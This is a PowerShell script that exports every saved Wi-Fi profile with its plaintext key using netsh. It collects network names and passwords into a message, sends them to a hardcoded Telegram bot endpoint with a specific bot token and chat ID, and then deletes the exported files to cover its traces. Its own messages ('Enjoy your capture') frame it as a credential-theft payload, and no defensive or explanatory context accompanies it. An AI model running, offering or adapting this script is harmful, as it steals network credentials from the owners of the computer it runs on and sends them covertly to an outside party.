Set-Location -Path $env:TEMP
netsh wlan export profile key=clear

$output = @()
$output += 'Success! There are ' + (Get-ChildItem -Path . -Filter Wi*.xml).Count + ' networks extracted.'
$output += ' Here is your exported list: '
Get-ChildItem -Path . -Filter Wi*.xml | ForEach-Object {
    $xml = [xml](Get-Content $_.FullName)
    $name = $xml.WLANProfile.name
    $key = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
    if ($key) {
        $output += ' -#|#- NETWORK NAME: ' + $name + ' | PASSWORD: ' + $key
    }
}
$output += ' -#|#- This is it. Enjoy your capture.'

$message = $output -join ''
$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
$body = @{
    'chat_id' = '656189986'
    'text' = $message
} | ConvertTo-Json
Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'

# Clean up exported files
Remove-Item -Path .\Wi-*.xml -Force -Recurse
